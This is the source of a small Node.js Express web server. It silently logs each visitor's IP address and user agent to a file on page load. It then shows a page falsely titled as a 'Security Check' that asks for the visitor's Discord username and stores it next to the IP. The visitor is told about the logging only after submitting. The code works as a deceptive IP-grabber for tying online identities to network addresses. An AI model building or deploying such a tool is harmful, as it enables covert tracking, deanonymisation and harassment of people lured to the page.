const express = require("express");
const fs = require("fs");
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse form data
app.use(express.urlencoded({ extended: true }));

app.get("/", (req, res) => {
    // Get IP address
    const forwardedFor = req.headers["x-forwarded-for"];
    const ip = forwardedFor ? forwardedFor.split(",")[0].trim() : req.socket.remoteAddress;

    // Get User-Agent
    const userAgent = req.headers["user-agent"] || "Unknown";

    // Log to console
    console.log(`New visitor IP: ${ip}`);
    console.log(`User-Agent: ${userAgent}`);

    // Append basic log entry (without Discord username)
    const logEntry = `${ip} | ${userAgent} | ${new Date().toLocaleString()}\n`;
    fs.appendFile("ips.txt", logEntry, (err) => {
        if (err) console.log("Error writing to file:", err);
    });

    // Send HTML page with Discord username input
    res.send(`
        <html>
            <head>
                <title>Welcome to the Security Check</title>
                <style>
                    body {
                        font-family: 'Arial', sans-serif;
                        background: linear-gradient(to right, #4facfe, #00f2fe);
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                    }
                    .container {
                        background-color: white;
                        border-radius: 8px;
                        padding: 40px;
                        width: 100%;
                        max-width: 400px;
                        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
                    }
                    h2 {
                        font-size: 24px;
                        text-align: center;
                        color: #333;
                        margin-bottom: 20px;
                    }
                    form {
                        display: flex;
                        flex-direction: column;
                    }
                    input[type="text"] {
                        padding: 10px;
                        margin-bottom: 15px;
                        border: 1px solid #ddd;
                        border-radius: 5px;
                        font-size: 16px;
                    }
                    button {
                        padding: 10px;
                        background-color: #4facfe;
                        color: white;
                        border: none;
                        border-radius: 5px;
                        font-size: 16px;
                        cursor: pointer;
                        transition: background-color 0.3s;
                    }
                    button:hover {
                        background-color: #00f2fe;
                    }
                    .footer {
                        text-align: center;
                        margin-top: 20px;
                        font-size: 14px;
                        color: #888;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <h2>Hi! Please enter your Discord username.</h2>
                    <form method="POST" action="/submit">
                        <input type="text" name="discord" placeholder="Discord username" required />
                        <button type="submit">Submit</button>
                    </form>
                </div>
            </body>
        </html>
    `);
});

// POST handler to capture Discord username
app.post("/submit", (req, res) => {
    const discordUsername = req.body.discord || "Not Provided";

    // Get IP and User-Agent again to log the full info
    const forwardedFor = req.headers["x-forwarded-for"];
    const ip = forwardedFor ? forwardedFor.split(",")[0].trim() : req.socket.remoteAddress;
    const userAgent = req.headers["user-agent"] || "Unknown";

    // Log entry with Discord username
    const logEntry = `${ip} | ${userAgent} | Discord: ${discordUsername} | ${new Date().toLocaleString()}\n`;
    fs.appendFile("ips.txt", logEntry, (err) => {
        if (err) console.log("Error writing to file:", err);
    });

    // Send confirmation response with styled page
    res.send(`
        <html>
            <head>
                <title>Thanks for Submitting!</title>
                <style>
                    body {
                        font-family: 'Arial', sans-serif;
                        background: linear-gradient(to right, #4facfe, #00f2fe);
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                    }
                    .container {
                        background-color: white;
                        border-radius: 8px;
                        padding: 40px;
                        width: 100%;
                        max-width: 400px;
                        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
                        text-align: center;
                    }
                    h2 {
                        font-size: 24px;
                        color: #333;
                        margin-bottom: 20px;
                    }
                    p {
                        color: #555;
                        font-size: 16px;
                        margin-top: 20px;
                    }
                    .footer {
                        text-align: center;
                        font-size: 14px;
                        color: #888;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <h2>Thanks! Your Discord username has been received.</h2>
                    <p>Your IP and Discord username have been logged.</p>
                </div>
            </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}!`);
});
